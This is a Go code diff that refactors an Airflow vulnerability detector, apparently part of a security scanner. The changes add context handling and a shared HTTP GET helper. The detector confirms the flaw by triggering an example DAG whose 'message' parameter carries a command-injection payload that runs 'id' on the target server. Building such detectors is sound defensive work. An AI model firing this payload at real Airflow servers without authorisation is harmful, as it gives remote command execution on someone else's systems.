@@ -25,8 +25,10 @@ import (
 	"fmt"
 	"io/fs"
 	"math/rand"
+	"net"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -58,7 +60,7 @@ const (
 
 var (
 	seededRand      = rand.New(rand.NewSource(time.Now().UnixNano()))
-	randFilePath    = fmt.Sprintf("/tmp/%s", randomString(16))
+	randFilePath    = "/tmp/" + randomString(16)
 	airflowPackages = []airflowPackageNames{
 		{
 			packageType: "pypi",
@@ -174,17 +176,17 @@ func (d Detector) Scan(ctx context.Context, scanRoot *scalibrfs.ScanRoot, ix *in
 
 	log.Infof("Found Potentially vulnerable airflow version %v", airflowVersion)
 
-	if !CheckAccessibility(airflowServerIP, airflowServerPort) {
+	if !CheckAccessibility(ctx, airflowServerIP, airflowServerPort) {
 		log.Infof("Airflow server not accessible. Version %q not vulnerable", airflowVersion)
 		return nil, nil
 	}
 
-	if !CheckForBashTask(airflowServerIP, airflowServerPort) {
+	if !CheckForBashTask(ctx, airflowServerIP, airflowServerPort) {
 		log.Infof("Version %q not vulnerable", airflowVersion)
 		return nil, nil
 	}
 
-	if !CheckForPause(airflowServerIP, airflowServerPort) {
+	if !CheckForPause(ctx, airflowServerIP, airflowServerPort) {
 		log.Infof("Version %q not vulnerable", airflowVersion)
 		return nil, nil
 	}
@@ -224,14 +226,34 @@ func (d Detector) Scan(ctx context.Context, scanRoot *scalibrfs.ScanRoot, ix *in
 	}}, nil
 }
 
-// CheckAccessibility checks if the airflow server is accessible.
-func CheckAccessibility(airflowIP string, airflowServerPort int) bool {
-	target := fmt.Sprintf("http://%s:%d/api/experimental/test", airflowIP, airflowServerPort)
+// doGetRequest does a GET request to the specified target URL and returns the response.
+//
+// If an error occurs, it will be logged and nil will be returned.
+func doGetRequest(ctx context.Context, target string) *http.Response {
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
 
-	client := &http.Client{Timeout: defaultTimeout}
-	resp, err := client.Get(target)
 	if err != nil {
 		log.Infof("Request failed: %v", err)
+		return nil
+	}
+
+	client := &http.Client{Timeout: defaultTimeout}
+	resp, err := client.Do(req)
+
+	if err != nil {
+		log.Infof("Request failed: %v", err)
+		return nil
+	}
+
+	return resp
+}
+
+// CheckAccessibility checks if the airflow server is accessible.
+func CheckAccessibility(ctx context.Context, airflowIP string, airflowServerPort int) bool {
+	target := fmt.Sprintf("http://%s/api/experimental/test", net.JoinHostPort(airflowIP, strconv.Itoa(airflowServerPort)))
+
+	resp := doGetRequest(ctx, target)
+	if resp == nil {
 		return false
 	}
 	defer resp.Body.Close()
@@ -239,13 +261,11 @@ func CheckAccessibility(airflowIP string, airflowServerPort int) bool {
 }
 
 // CheckForBashTask checks if the airflow server has a bash task.
-func CheckForBashTask(airflowIP string, airflowServerPort int) bool {
-	target := fmt.Sprintf("http://%s:%d/api/experimental/dags/example_trigger_target_dag/tasks/bash_task", airflowIP, airflowServerPort)
+func CheckForBashTask(ctx context.Context, airflowIP string, airflowServerPort int) bool {
+	target := fmt.Sprintf("http://%s/api/experimental/dags/example_trigger_target_dag/tasks/bash_task", net.JoinHostPort(airflowIP, strconv.Itoa(airflowServerPort)))
 
-	client := &http.Client{Timeout: defaultTimeout}
-	resp, err := client.Get(target)
-	if err != nil {
-		log.Infof("Request failed: %v", err)
+	resp := doGetRequest(ctx, target)
+	if resp == nil {
 		return false
 	}
 	defer resp.Body.Close()
@@ -256,7 +276,7 @@ func CheckForBashTask(airflowIP string, airflowServerPort int) bool {
 	}
 
 	var data map[string]any
-	if err = json.NewDecoder(resp.Body).Decode(&data); err != nil {
+	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
 		log.Infof("Error parsing JSON: %v", err)
 		return false
 	}
@@ -280,13 +300,11 @@ func CheckForBashTask(airflowIP string, airflowServerPort int) bool {
 }
 
 // CheckForPause checks if the airflow server has a paused dag.
-func CheckForPause(airflowIP string, airflowServerPort int) bool {
-	target := fmt.Sprintf("http://%s:%d/api/experimental/dags/example_trigger_target_dag/paused/false", airflowIP, airflowServerPort)
+func CheckForPause(ctx context.Context, airflowIP string, airflowServerPort int) bool {
+	target := fmt.Sprintf("http://%s/api/experimental/dags/example_trigger_target_dag/paused/false", net.JoinHostPort(airflowIP, strconv.Itoa(airflowServerPort)))
 
-	client := &http.Client{Timeout: defaultTimeout}
-	resp, err := client.Get(target)
-	if err != nil {
-		log.Infof("Request failed: %v", err)
+	resp := doGetRequest(ctx, target)
+	if resp == nil {
 		return false
 	}
 	defer resp.Body.Close()
@@ -295,7 +313,7 @@ func CheckForPause(airflowIP string, airflowServerPort int) bool {
 
 // triggerAndWaitForDAG achieves command execution via DAG scheduling using the example bash task from above.
 func triggerAndWaitForDAG(ctx context.Context, airflowIP string, airflowServerPort int) bool {
-	dagURL := fmt.Sprintf("http://%s:%d/api/experimental/dags/example_trigger_target_dag/dag_runs", airflowIP, airflowServerPort)
+	dagURL := fmt.Sprintf("http://%s/api/experimental/dags/example_trigger_target_dag/dag_runs", net.JoinHostPort(airflowIP, strconv.Itoa(airflowServerPort)))
 	payload := map[string]any{
 		"conf": map[string]string{
 			"message": fmt.Sprintf(`"; id > %s #`, randFilePath),
@@ -349,8 +367,10 @@ func triggerAndWaitForDAG(ctx context.Context, airflowIP string, airflowServerPo
 		return false
 	}
 
-	waitURL := fmt.Sprintf("http://%s:%d/api/experimental/dags/example_trigger_target_dag/dag_runs/%s/tasks/bash_task",
-		airflowIP, airflowServerPort, resBody["execution_date"])
+	waitURL := fmt.Sprintf(
+		"http://%s/api/experimental/dags/example_trigger_target_dag/dag_runs/%s/tasks/bash_task",
+		net.JoinHostPort(airflowIP, strconv.Itoa(airflowServerPort)), resBody["execution_date"],
+	)
 
 	log.Infof("Waiting for the scheduler to run the DAG... This might take a minute.")
 	log.Infof("If the bash task is never queued, then the scheduler might not be running.")
@@ -362,7 +382,14 @@ func triggerAndWaitForDAG(ctx context.Context, airflowIP string, airflowServerPo
 			return false
 		}
 		time.Sleep(schedulerTimeout)
-		res, err := http.Get(waitURL)
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, waitURL, nil)
+
+		if err != nil {
+			log.Infof("failed to build request: %v", err)
+			return false
+		}
+
+		res, err := http.DefaultClient.Do(req)
 		if err != nil {
 			log.Infof("failed to get task status: %v", err)
 		}
